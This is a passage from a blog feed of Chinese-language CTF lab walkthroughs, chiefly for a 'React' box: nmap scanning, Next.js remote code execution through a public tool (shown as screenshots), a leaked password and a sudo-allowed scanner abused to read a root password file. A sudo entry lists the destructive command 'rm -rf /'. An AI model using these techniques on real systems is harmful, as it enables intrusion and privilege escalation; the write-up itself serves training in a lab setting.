<span class="hljs-built_in">groups</span>=0(root)<br></code></pre></td></tr></table></figure><h1 id="六、获取FLAG"><a href="#六、获取FLAG" class="headerlink" title="六、获取FLAG"></a>六、获取FLAG</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@Search:~# <span class="hljs-built_in">cat</span> 499f7ecdb8434a7a962b9d5c6d88edce.txt  /home/7r1umphk/user.txt <br>flag&#123;root-499f7ecdb8434a7a962b9d5c6d88edce&#125;<br>flag&#123;user-681db772f6844d4c84da083c3d280954&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Maze-sec</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cms-feehi</tag>
      
      <tag>sudo-dirsearch</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>React</title>
    <link href="/Maze-sec/React/"/>
    <url>/Maze-sec/React/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="靶机说明"><a href="#靶机说明" class="headerlink" title="靶机说明"></a>靶机说明</h1><ul><li>QQ群：<code>660930334</code></li></ul><h1 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h1><h2 id="1、主机探测"><a href="#1、主机探测" class="headerlink" title="1、主机探测"></a>1、主机探测</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec]<br>└─# nmap -sn 192.168.2.0/24<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-12-16 15:15 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.1<br>Host is up (0.00068s latency).<br>MAC Address: 0A:00:27:00:00:07 (Unknown)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.2<br>Host is up (0.00031s latency).<br>MAC Address: 08:00:27:59:EA:A8 (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.27<br>Host is up (0.00062s latency).<br>MAC Address: 08:00:27:40:AA:43 (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.4<br>Host is up.<br>Nmap <span class="hljs-keyword">done</span>: 256 IP addresses (4 hosts up) scanned <span class="hljs-keyword">in</span> 2.18 seconds<br></code></pre></td></tr></table></figure><p>靶机IP：<code>192.168.2.27</code></p><h2 id="2、端口扫描"><a href="#2、端口扫描" class="headerlink" title="2、端口扫描"></a>2、端口扫描</h2><h3 id="1-全端口扫描"><a href="#1-全端口扫描" class="headerlink" title="1.全端口扫描"></a>1.全端口扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec]<br>└─# nmap --min-rate 10000 -p- 192.168.2.27<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-12-16 15:15 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.27<br>Host is up (0.00066s latency).<br>Not shown: 65532 closed tcp ports (reset)<br>PORT     STATE SERVICE<br>22/tcp   open  ssh<br>80/tcp   open  http<br>3000/tcp open  ppp<br>MAC Address: 08:00:27:40:AA:43 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 15.77 seconds<br></code></pre></td></tr></table></figure><p>开放端口：<code>22、80、3000</code></p><h3 id="2-详细信息扫描"><a href="#2-详细信息扫描" class="headerlink" title="2.详细信息扫描"></a>2.详细信息扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec]<br>└─# nmap --min-rate 10000 -sT -sV -sC -O -p22,80,3000 192.168.2.27<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-12-16 15:16 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.27<br>Host is up (0.00054s latency).<br><br>PORT     STATE SERVICE VERSION<br>22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)<br>| ssh-hostkey: <br>|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)<br>|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)<br>|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)<br>80/tcp   open  http    Apache httpd 2.4.62 ((Debian))<br>|_http-title: \xE7\xBD\x91\xE7\xBB\x9C\xE8\xAF\x8A\xE6\x96\xAD\xE5\xB7\xA5\xE5\x85\xB7<br>|_http-server-header: Apache/2.4.62 (Debian)<br>3000/tcp open  ppp?<br>| fingerprint-strings: <br>|   GetRequest: <br>|     HTTP/1.1 200 OK<br>|     Vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Router-Segment-Prefetch, Accept-Encoding<br>|     x-nextjs-cache: HIT<br>|     x-nextjs-prerender: 1<br>|     x-nextjs-stale-time: 4294967294<br>|     X-Powered-By: Next.js<br>|     Cache-Control: s-maxage=31536000, <br>|     ETag: <span class="hljs-string">&quot;vhwrqricd17bt&quot;</span><br>|     Content-Type: text/html; charset=utf-8<br>|     Content-Length: 9497<br>|     Date: Tue, 16 Dec 2025 07:16:30 GMT<br>|     Connection: close<br>|     &lt;!DOCTYPE html&gt;&lt;html lang=<span class="hljs-string">&quot;en&quot;</span>&gt;&lt;<span class="hljs-built_in">head</span>&gt;&lt;meta charSet=<span class="hljs-string">&quot;utf-8&quot;</span>/&gt;&lt;meta name=<span class="hljs-string">&quot;viewport&quot;</span> content=<span class="hljs-string">&quot;width=device-width, initial-scale=1&quot;</span>/&gt;&lt;<span class="hljs-built_in">link</span> rel=<span class="hljs-string">&quot;preload&quot;</span> as=<span class="hljs-string">&quot;image&quot;</span> href=<span class="hljs-string">&quot;/next.svg&quot;</span>/&gt;&lt;<span class="hljs-built_in">link</span> rel=<span class="hljs-string">&quot;stylesheet&quot;</span> href=<span class="hljs-string">&quot;/_next/static/css/97f208c543225968.css&quot;</span> data-precedence=<span class="hljs-string">&quot;next&quot;</span>/&gt;&lt;<span class="hljs-built_in">link</span> rel=<span class="hljs-string">&quot;preload&quot;</span> as=<span class="hljs-string">&quot;script&quot;</span> fetchPriority=<span class="hljs-string">&quot;low&quot;</span> href=<span class="hljs-string">&quot;/_next/static/chunks/webpack-744ee3f145013e34.js&quot;</span>/&gt;&lt;script src=<span class="hljs-string">&quot;/_next/static/chunks/4bd1b696-6985518451956beb.js&quot;</span> async=<span class="hljs-string">&quot;&quot;</span>&gt;&lt;/script&gt;&lt;script src=<span class="hljs-string">&quot;/_next/static/chunks/215-</span><br><span class="hljs-string">|   HTTPOptions, RTSPRequest: </span><br><span class="hljs-string">|     HTTP/1.1 400 Bad Request</span><br><span class="hljs-string">|     vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Router-Segment-Prefetch</span><br><span class="hljs-string">|     Allow: GET</span><br><span class="hljs-string">|     Allow: HEAD</span><br><span class="hljs-string">|     Cache-Control: private, no-cache, no-store, max-age=0, must-revalidate</span><br><span class="hljs-string">|     Date: Tue, 16 Dec 2025 07:16:30 GMT</span><br><span class="hljs-string">|     Connection: close</span><br><span class="hljs-string">|   Help, NCP: </span><br><span class="hljs-string">|     HTTP/1.1 400 Bad Request</span><br><span class="hljs-string">|_    Connection: close</span><br><span class="hljs-string">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :</span><br><span class="hljs-string">SF-Port3000-TCP:V=7.94SVN%I=7%D=12/16%Time=6941074F%P=x86_64-pc-linux-gnu%</span><br><span class="hljs-string">SF:r(GetRequest,26A9,&quot;</span>HTTP/1\.1\x20200\x20OK\r\nVary:\x20RSC,\x20Next-Rout<br>SF:er-State-Tree,\x20Next-Router-Prefetch,\x20Next-Router-Segment-Prefetch<br>SF:,\x20Accept-Encoding\r\nx-nextjs-cache:\x20HIT\r\nx-nextjs-prerender:\x<br>SF:201\r\nx-nextjs-stale-time:\x204294967294\r\nX-Powered-By:\x20Next\.js\<br>SF:r\nCache-Control:\x20s-maxage=31536000,\x20\r\nETag:\x20\&quot;vhwrqricd17bt<br>SF:\&quot;\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x<br>SF:209497\r\nDate:\x20Tue,\x2016\x20Dec\x202025\x2007:16:30\x20GMT\r\nConn<br>SF:ection:\x20close\r\n\r\n&lt;!DOCTYPE\x20html&gt;&lt;html\x20lang=\&quot;en\&quot;&gt;&lt;<span class="hljs-built_in">head</span>&gt;&lt;m<br>SF:eta\x20charSet=\&quot;utf-8\&quot;/&gt;&lt;meta\x20name=\&quot;viewport\&quot;\x20content=\&quot;width<br>SF:=device-width,\x20initial-scale=1\&quot;/&gt;&lt;<span class="hljs-built_in">link</span>\x20rel=\&quot;preload\&quot;\x20as=\&quot;i<br>SF:mage\&quot;\x20href=\&quot;/next\.svg\&quot;/&gt;&lt;<span class="hljs-built_in">link</span>\x20rel=\&quot;stylesheet\&quot;\x20href=\&quot;/_<br>SF:next/static/css/97f208c543225968\.css\&quot;\x20data-precedence=\&quot;next\&quot;/&gt;&lt;l<br>SF:ink\x20rel=\&quot;preload\&quot;\x20as=\&quot;script\&quot;\x20fetchPriority=\&quot;low\&quot;\x20hre<br>SF:f=\&quot;/_next/static/chunks/webpack-744ee3f145013e34\.js\&quot;/&gt;&lt;script\x20src<br>SF:=\&quot;/_next/static/chunks/4bd1b696-6985518451956beb\.js\&quot;\x20async=\&quot;\&quot;&gt;&lt;<br>SF:/script&gt;&lt;script\x20src=\&quot;/_next/static/chunks/215-<span class="hljs-string">&quot;)%r(Help,2F,&quot;</span>HTTP/1\<br>SF:.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n<span class="hljs-string">&quot;)%r(NCP,2F,</span><br><span class="hljs-string">SF:&quot;</span>HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n<span class="hljs-string">&quot;)%r</span><br><span class="hljs-string">SF:(HTTPOptions,10C,&quot;</span>HTTP/1\.1\x20400\x20Bad\x20Request\r\nvary:\x20RSC,\x<br>SF:20Next-Router-State-Tree,\x20Next-Router-Prefetch,\x20Next-Router-Segme<br>SF:nt-Prefetch\r\nAllow:\x20GET\r\nAllow:\x20HEAD\r\nCache-Control:\x20pri<br>SF:vate,\x20no-cache,\x20no-store,\x20max-age=0,\x20must-revalidate\r\nDat<br>SF:e:\x20Tue,\x2016\x20Dec\x202025\x2007:16:30\x20GMT\r\nConnection:\x20cl<br>SF:ose\r\n\r\n<span class="hljs-string">&quot;)%r(RTSPRequest,10C,&quot;</span>HTTP/1\.1\x20400\x20Bad\x20Request\r\n<br>SF:vary:\x20RSC,\x20Next-Router-State-Tree,\x20Next-Router-Prefetch,\x20Ne<br>SF:xt-Router-Segment-Prefetch\r\nAllow:\x20GET\r\nAllow:\x20HEAD\r\nCache-<br>SF:Control:\x20private,\x20no-cache,\x20no-store,\x20max-age=0,\x20must-re<br>SF:validate\r\nDate:\x20Tue,\x2016\x20Dec\x202025\x2007:16:30\x20GMT\r\nCo<br>SF:nnection:\x20close\r\n\r\n<span class="hljs-string">&quot;);</span><br><span class="hljs-string">MAC Address: 08:00:27:40:AA:43 (Oracle VirtualBox virtual NIC)</span><br><span class="hljs-string">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="hljs-string">Device type: general purpose</span><br><span class="hljs-string">Running: Linux 4.X|5.X</span><br><span class="hljs-string">OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5</span><br><span class="hljs-string">OS details: Linux 4.15 - 5.8, Linux 5.0 - 5.5</span><br><span class="hljs-string">Network Distance: 1 hop</span><br><span class="hljs-string">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="hljs-string"></span><br><span class="hljs-string">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="hljs-string">Nmap done: 1 IP address (1 host up) scanned in 14.01 seconds</span><br></code></pre></td></tr></table></figure><ol><li><strong>22端口：</strong> ssh服务</li><li><strong>80端口：</strong> http服务</li><li><strong>3000端口：</strong> next.js服务</li></ol><h1 id="二、Next-js漏洞利用"><a href="#二、Next-js漏洞利用" class="headerlink" title="二、Next.js漏洞利用"></a>二、Next.js漏洞利用</h1><p>使用工具直接梭哈，<br><code>Next.js</code>利用工具： <a href="https://github.com/Rsatan/Next.js-Exploit-Tool">https://github.com/Rsatan/Next.js-Exploit-Tool</a></p><p><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202512161659004.png"></p><p>直接反弹shell<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202512161701469.png"></p><h1 id="三、获取bot权限"><a href="#三、获取bot权限" class="headerlink" title="三、获取bot权限"></a>三、获取bot权限</h1><p>获取到shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">bot@React:/opt/target$ <span class="hljs-built_in">id</span><br>uid=1000(bot) gid=1000(bot) <span class="hljs-built_in">groups</span>=1000(bot)<br></code></pre></td></tr></table></figure><h1 id="四、权限提升"><a href="#四、权限提升" class="headerlink" title="四、权限提升"></a>四、权限提升</h1><p>查看到<code>bot</code>用户密码，<code>/opt/target/start.sh</code>，<code>lMmqr98vg3Ke1Mu4hJwN</code></p><p>使用ssh进行连接，提示<code>Host key verification failed</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~]<br>└─# ssh bot@192.168.2.27  <br>@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@<br>@    WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED!     @<br>@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@<br>IT IS POSSIBLE THAT SOMEONE IS DOING SOMETHING NASTY!<br>Someone could be eavesdropping on you right now (man-in-the-middle attack)!<br>It is also possible that a host key has just been changed.<br>The fingerprint <span class="hljs-keyword">for</span> the ED25519 key sent by the remote host is<br>SHA256:O2iH79i8PgOwV/Kp8ekTYyGMG8iHT+YlWuYC85SbWSQ.<br>Please contact your system administrator.<br>Add correct host key <span class="hljs-keyword">in</span> /root/.ssh/known_hosts to get rid of this message.<br>Offending ED25519 key <span class="hljs-keyword">in</span> /root/.ssh/known_hosts:4<br>  remove with:<br>  ssh-keygen -f <span class="hljs-string">&#x27;/root/.ssh/known_hosts&#x27;</span> -R <span class="hljs-string">&#x27;192.168.2.27&#x27;</span><br>Host key <span class="hljs-keyword">for</span> 192.168.2.27 has changed and you have requested strict checking.<br>Host key verification failed.<br></code></pre></td></tr></table></figure><p>使用<code>ssh-keygen</code>移除</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~]<br>└─# ssh-keygen -R 192.168.2.27  <br><span class="hljs-comment"># Host 192.168.2.27 found: line 4</span><br>/root/.ssh/known_hosts updated.<br>Original contents retained as /root/.ssh/known_hosts.old<br></code></pre></td></tr></table></figure><p>重新进行连接</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~]<br>└─# ssh bot@192.168.2.27      <br>The authenticity of host <span class="hljs-string">&#x27;192.168.2.27 (192.168.2.27)&#x27;</span> can<span class="hljs-string">&#x27;t be established.</span><br><span class="hljs-string">ED25519 key fingerprint is SHA256:O2iH79i8PgOwV/Kp8ekTYyGMG8iHT+YlWuYC85SbWSQ.</span><br><span class="hljs-string">This host key is known by the following other names/addresses:</span><br><span class="hljs-string">    ~/.ssh/known_hosts:4: [hashed name]</span><br><span class="hljs-string">    ~/.ssh/known_hosts:6: [hashed name]</span><br><span class="hljs-string">    ~/.ssh/known_hosts:7: [hashed name]</span><br><span class="hljs-string">    ~/.ssh/known_hosts:12: [hashed name]</span><br><span class="hljs-string">    ~/.ssh/known_hosts:13: [hashed name]</span><br><span class="hljs-string">    ~/.ssh/known_hosts:14: [hashed name]</span><br><span class="hljs-string">    ~/.ssh/known_hosts:15: [hashed name]</span><br><span class="hljs-string">    ~/.ssh/known_hosts:16: [hashed name]</span><br><span class="hljs-string">    (20 additional names omitted)</span><br><span class="hljs-string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class="hljs-string">Warning: Permanently added &#x27;</span>192.168.2.27<span class="hljs-string">&#x27; (ED25519) to the list of known hosts.</span><br><span class="hljs-string">bot@192.168.2.27&#x27;</span>s password: <br>Linux React 4.19.0-27-amd64 <span class="hljs-comment">#1 SMP Debian 4.19.316-1 (2024-06-25) x86_64</span><br><br>The programs included with the Debian GNU/Linux system are free software;<br>the exact distribution terms <span class="hljs-keyword">for</span> each program are described <span class="hljs-keyword">in</span> the<br>individual files <span class="hljs-keyword">in</span> /usr/share/doc/*/copyright.<br><br>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent<br>permitted by applicable law.<br>bot@React:~$ <br></code></pre></td></tr></table></figure><p>查看<code>sudo -l</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">bot@React:/opt/target$ <span class="hljs-built_in">sudo</span> -l<br>Matching Defaults entries <span class="hljs-keyword">for</span> bot on React:<br>    env_reset, mail_badpass,<br>    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin<br><br>User bot may run the following commands on React:<br>    (ALL) NOPASSWD: /opt/react2shell/scanner.py<br>    (ALL) NOPASSWD: /usr/bin/rm -rf /<br></code></pre></td></tr></table></figure><p>查看<code>scanner.py</code>的使用方法</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs bash">bot@React:~$ <span class="hljs-built_in">sudo</span> /opt/react2shell/scanner.py -h<br>usage: scanner.py [-h] (-u URL | -l LIST) [-t THREADS] [--<span class="hljs-built_in">timeout</span> TIMEOUT] [-o OUTPUT] [--all-results] [-k] [-H HEADER] [-v] [-q]<br>      [--no-color] [--safe-check] [--windows] [--waf-bypass] [--waf-bypass-size KB]<br><br>React2Shell Scanner<br><br>optional arguments:<br>  -h, --<span class="hljs-built_in">help</span>            show this <span class="hljs-built_in">help</span> message and <span class="hljs-built_in">exit</span><br>  -u URL, --url URL     Single URL/host to check<br>  -l LIST, --list LIST  File containing list of hosts (one per line)<br>  -t THREADS, --threads THREADS<br>   Number of concurrent threads (default: 10)<br>  --<span class="hljs-built_in">timeout</span> TIMEOUT     Request <span class="hljs-built_in">timeout</span> <span class="hljs-keyword">in</span> seconds (default: 10)<br>  -o OUTPUT, --output OUTPUT<br>  Output file <span class="hljs-keyword">for</span> results (JSON format)<br>  --all-results         Save all results to output file, not just vulnerable hosts<br>  -k, --insecure        Disable SSL certificate verification<br>  -H HEADER, --header HEADER<br>   Custom header <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;Key: Value&#x27;</span> format (can be used multiple <span class="hljs-built_in">times</span>)<br>  -v, --verbose         Verbose output (show response snippets <span class="hljs-keyword">for</span> vulnerable hosts)<br>  -q, --quiet           Quiet mode (only show vulnerable hosts)<br>  --no-color            Disable colored output<br>  --safe-check          Use safe side-channel detection instead of RCE PoC<br>  --windows             Use Windows PowerShell payload instead of Unix shell<br>  --waf-bypass          Add junk data to bypass WAF content inspection (default: 128KB)<br>  --waf-bypass-size KB  Size of junk data <span class="hljs-keyword">in</span> KB <span class="hljs-keyword">for</span> WAF bypass (default: 128)<br><br>Examples:<br>  scanner.py -u https://example.com<br>  scanner.py -l hosts.txt -t 20 -o results.json<br>  scanner.py -l hosts.txt --threads 50 --<span class="hljs-built_in">timeout</span> 15<br>  scanner.py -u https://example.com -H <span class="hljs-string">&quot;Authorization: Bearer token&quot;</span> -H <span class="hljs-string">&quot;User-Agent: CustomAgent&quot;</span><br></code></pre></td></tr></table></figure><p>参数<code>-l</code>可以读取文件，参数<code>-o</code>保存输出，参数<code>--all-results</code>可以保存所有内容</p><p>找到一个敏感二进制文件<code>/usr/bin/check_key</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">bot@React:~$ strings /usr/bin/check_key<br>....<br><span class="hljs-built_in">cp</span> /root/Reactrootpass.txt /opt<br>....<br></code></pre></td></tr></table></figure><p>发现存在一个文件<code>/root/Reactrootpass.txt</code>，直接读取</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash">bot@React:/opt$ <span class="hljs-built_in">sudo</span> /opt/react2shell/scanner.py -l /root/Reactrootpass.txt -o /tmp/3.txt --all-results<br><br>brought to you by assetnote<br><br>[*] Loaded 1 host(s) to scan<br>[*] Using 10 thread(s)<br>[*] Timeout: 10s<br>[*] Using RCE PoC check<br>[!] SSL verification disabled<br><br>[ERROR] To75CuOTHLA7BMmH5Puv - Connection Error: HTTPSConnectionPool(host=<span class="hljs-string">&#x27;to75cuothla7bmmh5puv&#x27;</span>, port=443): Max retries exceeded with url: / (Caused by NameResolutionError(<span class="hljs-string">&quot;HTTPSConnection(host=&#x27;to75cuothla7bmmh5puv&#x27;, port=443): Failed to resolve &#x27;to75cuothla7bmmh5puv&#x27; ([Errno -3] Temporary failure in name resolution)&quot;</span>))<br><br>============================================================<br>SCAN SUMMARY<br>============================================================<br>  Total hosts scanned: 1<br>  Vulnerable: 0<br>  Not vulnerable: 1<br>  Errors: 0<br>============================================================<br><br>[+] Results saved to: /tmp/3.txt<br></code></pre></td></tr></table></figure><p>获得一个字符串<code>To75CuOTHLA7BMmH5Puv</code></p><p>直接登录root</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">bot@React:/opt$ su root<br>Password: <br>root@React:/opt# <span class="hljs-built_in">id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root)<br></code></pre></td></tr></table></figure><h1 id="五、获取FLAG"><a href="#五、获取FLAG" class="headerlink" title="五、获取FLAG"></a>五、获取FLAG</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@React:/opt# <span class="hljs-built_in">cat</span> /root/root.txt /home/bot/user.txt <br>flag&#123;root-bc29a7159b63b18dc294002be32e1c22&#125;<br>flag&#123;user-4bb58d8876c0423d7f759a4d2dfa9cac&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Maze-sec</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Next.js</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Kuai</title>
    <link href="/Maze-sec/Kuai/"/>
    <url>/Maze-sec/Kuai/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="靶机说明"><a href="#靶机说明" class="headerlink" title="靶机说明"></a>靶机说明</h1><ul><li>QQ群：<code>660930334</code></li></ul><h1 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h1><h2 id="1、主机探测"><a href="#1、主机探测" class="headerlink" title="1、主机探测"></a>1、主机探测</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miaosec]<br>└─# nmap -sn 192.168.2.0/24               <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-12-24 15:16 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.1<br>Host is up (0.00092s latency).<br>MAC Address: 0A:00:27:00:00:07 